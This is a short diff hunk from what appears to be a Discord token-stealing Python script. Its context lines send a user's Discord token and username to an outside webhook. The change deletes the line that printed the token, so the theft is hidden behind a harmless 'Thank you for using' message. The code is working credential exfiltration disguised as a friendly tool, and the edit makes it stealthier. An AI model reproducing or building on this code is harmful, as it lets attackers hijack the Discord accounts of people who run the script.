@@ -78,6 +78,5 @@ a = j['username'] + "#" + j['discriminator']
 webhook = Webhook.from_url(web_hook_url, adapter=RequestsWebhookAdapter())
 ok = "Token: " + token + "\n Username: " + a
 webhook.send(ok)
-print(ok)
 print("Thank you for using")
        
